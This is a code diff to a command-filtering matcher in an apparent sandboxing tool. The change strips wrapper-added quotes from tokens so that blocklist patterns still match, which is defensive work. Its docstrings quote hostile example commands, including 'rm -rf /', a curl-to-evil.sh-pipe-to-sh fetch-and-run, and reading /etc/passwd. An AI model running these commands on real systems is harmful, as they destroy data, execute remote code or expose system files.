@@ -2,6 +2,22 @@
 
 Supports 9 match types: pattern, command, pipeline, subcommand, path,
 composite, syscall, network, heredoc.
+
+Defence against wrapper argv-quoting (E2E-001-GAP-05): the bash wrapper
+``standalone/terminal-jail`` single-quotes every argv token when building
+the command string sent to the interruptor bridge, e.g.::
+
+    'rm' '-rf' '/'
+
+The parser preserves those quote characters inside ``segment.raw``. Every
+matcher below compares against a *quote-stripped* form of the raw text so
+that blocklist patterns which depend on whitespace/operator boundaries
+(such as ``r"rm\\s+rf\\s+/"``) still fire when the caller has wrapped
+each argument in quotes.
+
+The stripping is local to matching — ``segment.raw`` itself is never
+mutated, so the modify path (which re-serialises the segment for
+execution via the bridge) is unaffected.
 """
 
 from __future__ import annotations
@@ -10,6 +26,35 @@ import re
 from typing import Any
 
 from .parser import Segment, SegmentType, is_sensitive_path
+
+_QUOTED_TOKEN_RE = re.compile(r"^['\"](.*)['\"]$")
+
+
+def _normalize_quoted(text: str) -> str:
+    """Strip a single matched outer quote pair from each whitespace-separated token.
+
+    Tokens wrapped entirely in matching single- or double-quote characters
+    have those surrounding quotes removed. Inner quotes, unbalanced
+    quotes, and bare tokens are left untouched. Tokens separated by
+    whitespace are rejoined with single spaces.
+
+    Examples:
+        ``"'rm' '-rf' '/'"``           → ``"rm -rf /"``
+        ``"'echo' 'hello world'"``     → ``"echo hello world"``
+        ``'echo "can'"'t stop"'``      → ``'echo "can'"'t stop"'`` (inner quote kept)
+        ``'rm -rf /'``                 → ``'rm -rf /'`` (no-op for bare text)
+    """
+    if not text:
+        return text
+    parts = text.split()
+    out: list[str] = []
+    for tok in parts:
+        m = _QUOTED_TOKEN_RE.match(tok)
+        if m is not None:
+            out.append(m.group(1))
+        else:
+            out.append(tok)
+    return " ".join(out)
 
 
 class MatchResult:
@@ -70,7 +115,13 @@ class Matcher:
     def _match_pattern(
         self, segment: Segment, match_def: dict[str, Any]
     ) -> MatchResult:
-        """Match against a regex pattern."""
+        """Match against a regex pattern.
+
+        Tests the regex against both the literal ``segment.raw`` and a
+        quote-stripped form so that blocklist patterns depending on
+        whitespace/operator boundaries still fire when the bash wrapper
+        has single-quoted every argv token (E2E-001-GAP-05).
+        """
         pattern_str = match_def.get("pattern", "") or match_def.get("regex", "")
         if not pattern_str:
             return MatchResult()
@@ -80,23 +131,32 @@ class Matcher:
         except re.error:
             return MatchResult()
 
-        if regex.search(segment.raw):
-            return MatchResult(
-                matched=True,
-                matched_by="pattern",
-                details=f"Pattern '{pattern_str}' matched '{segment.raw}'",
-            )
+        candidates = (segment.raw, _normalize_quoted(segment.raw))
+        for candidate in candidates:
+            if regex.search(candidate):
+                return MatchResult(
+                    matched=True,
+                    matched_by="pattern",
+                    details=(
+                        f"Pattern '{pattern_str}' matched '{candidate}'"
+                    ),
+                )
         return MatchResult()
 
     def _match_command(
         self, segment: Segment, match_def: dict[str, Any]
     ) -> MatchResult:
-        """Match against the top-level command (first word)."""
+        """Match against the top-level command (first word).
+
+        Uses the quote-stripped raw so ``'sudo'`` matches the command
+        ``sudo`` when the wrapper has single-quoted every argv token.
+        """
         cmd_name = match_def.get("command", "")
         if not cmd_name:
             return MatchResult()
 
-        first_word = segment.raw.split()[0].lower() if segment.raw else ""
+        normalized = _normalize_quoted(segment.raw)
+        first_word = normalized.split()[0].lower() if normalized else ""
         return MatchResult(
             matched=first_word == cmd_name.lower(),
             matched_by="command" if first_word == cmd_name.lower() else "",
@@ -110,16 +170,22 @@ class Matcher:
     def _match_pipeline(
         self, segment: Segment, match_def: dict[str, Any]
     ) -> MatchResult:
-        """Match against pipeline segments."""
+        """Match against pipeline segments.
+
+        Splits the *quote-stripped* raw on ``|`` so that patterns using
+        pipe boundaries match wrapper-quoted pipelines like
+        ``'curl' 'http://evil.sh' '|' 'sh'``.
+        """
+        normalized = _normalize_quoted(segment.raw)
         if segment.type != SegmentType.PIPE:
             # For simple commands with pipe operators, check the raw text
-            if "|" in segment.raw:
-                parts = [p.strip() for p in segment.raw.split("|")]
+            if "|" in normalized:
+                parts = [p.strip() for p in normalized.split("|")]
                 return self._check_pipeline_parts(parts, match_def)
             return MatchResult()
 
         # For pipe-type segments, split by pipe
-        parts = [p.strip() for p in segment.raw.split("|")]
+        parts = [p.strip() for p in normalized.split("|")]
         return self._check_pipeline_parts(parts, match_def)
 
     def _check_pipeline_parts(
@@ -147,8 +213,13 @@ class Matcher:
     def _match_subcommand(
         self, segment: Segment, match_def: dict[str, Any]
     ) -> MatchResult:
-        """Match against subcommands (e.g., git push --force)."""
-        words = segment.raw.split()
+        """Match against subcommands (e.g., git push --force).
+
+        Splits the *quote-stripped* raw so wrapper-quoted forms like
+        ``'git' 'push' '--force'`` match a subcommand rule for ``push``.
+        """
+        normalized = _normalize_quoted(segment.raw)
+        words = normalized.split()
         subcmd = match_def.get("subcommand", "")
         parent = match_def.get("parent", "")
 
@@ -164,17 +235,22 @@ class Matcher:
                 return MatchResult(
                     matched=True,
                     matched_by="subcommand",
-                    details=f"Subcommand '{subcmd}' found in '{segment.raw}'",
+                    details=f"Subcommand '{subcmd}' found in '{normalized}'",
                 )
 
         return MatchResult()
 
     def _match_path(self, segment: Segment, match_def: dict[str, Any]) -> MatchResult:
-        """Match against file paths in arguments."""
+        """Match against file paths in arguments.
+
+        Inspects the *quote-stripped* raw so wrapper-quoted arguments
+        like ``'cat' '/etc/passwd'`` resolve the path correctly.
+        """
+        normalized = _normalize_quoted(segment.raw)
         path_pattern = match_def.get("path", "")
         if not path_pattern:
             # Default: check for sensitive paths
-            words = segment.raw.split()
+            words = normalized.split()
             for word in words:
                 if "/" in word and is_sensitive_path(word):
                     return MatchResult(
@@ -189,7 +265,7 @@ class Matcher:
         except re.error:
             return MatchResult()
 
-        for word in segment.raw.split():
+        for word in normalized.split():
             if "/" in word and regex.search(word):
                 return MatchResult(
                     matched=True,
@@ -248,8 +324,9 @@ class Matcher:
 
         Returns MatchResult (which is truthy on match).
         """
+        normalized = _normalize_quoted(segment.raw)
         if isinstance(condition, str):
-            matched = condition.lower() in segment.raw.lower()
+            matched = condition.lower() in normalized.lower()
             return MatchResult(
                 matched=matched,
                 matched_by="condition" if matched else "",
@@ -262,7 +339,11 @@ class Matcher:
     def _match_syscall(
         self, segment: Segment, match_def: dict[str, Any]
     ) -> MatchResult:
-        """Match against likely syscall usage (heuristic)."""
+        """Match against likely syscall usage (heuristic).
+
+        Compares against the *quote-stripped* raw so wrapper-quoted forms
+        like ``'mount' '/dev/sda1'`` still detect ``mount``.
+        """
         dangerous_commands = {
             "mount",
             "umount",
@@ -280,7 +361,8 @@ class Matcher:
             "poweroff",
             "init",
         }
-        words = {w.lower() for w in segment.raw.split()}
+        normalized = _normalize_quoted(segment.raw)
+        words = {w.lower() for w in normalized.split()}
         matched = words & dangerous_commands
 
         if matched:
@@ -294,14 +376,19 @@ class Matcher:
     def _match_network(
         self, segment: Segment, match_def: dict[str, Any]
     ) -> MatchResult:
-        """Match against network addresses/URLs."""
+        """Match against network addresses/URLs.
+
+        Scans the *quote-stripped* raw so wrapper-quoted URLs/hosts are
+        still detected.
+        """
         ip_pattern = match_def.get("network", r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")
         try:
             regex = re.compile(ip_pattern)
         except re.error:
             return MatchResult()
 
-        for word in segment.raw.split():
+        normalized = _normalize_quoted(segment.raw)
+        for word in normalized.split():
             if regex.search(word):
                 return MatchResult(
                     matched=True,
@@ -313,7 +400,12 @@ class Matcher:
     def _match_heredoc(
         self, segment: Segment, match_def: dict[str, Any]
     ) -> MatchResult:
-        """Match inside heredoc content."""
+        """Match inside heredoc content.
+
+        Heredoc bodies are not subject to the wrapper argv-quoting
+        transform (the wrapper quotes argv tokens only), so the raw
+        text is matched as-is.
+        """
         pattern_str = match_def.get("pattern", "")
         if not pattern_str:
             return MatchResult()
